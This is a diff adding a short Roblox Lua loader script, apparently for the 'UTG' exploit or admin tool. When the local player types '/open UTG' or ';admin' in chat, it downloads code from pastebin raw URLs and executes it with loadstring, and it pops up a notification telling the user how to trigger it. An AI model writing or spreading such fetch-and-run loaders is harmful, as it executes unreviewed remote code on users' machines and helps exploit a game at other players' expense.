@@ -1,0 +1,15 @@
+local Player = game.Players.LocalPlayer
+ 
+Player.Chatted:connect(function(cht)
+	if cht:match("/open UTG") then
+		loadstring(game:HttpGet("https://pastebin.com/raw/NhRrqGgy", true))()
+	elseif cht:match(";admin") then 
+		loadstring(game:HttpGet("https://pastebin.com/raw/iM2Hhq68", true))()
+	end
+end)
+ 
+game:GetService("StarterGui"):SetCore("SendNotification",{
+    Title = "Loaded UTG";
+    Text = "say /open UTG on the chat for UTG appear";
+})
+ 
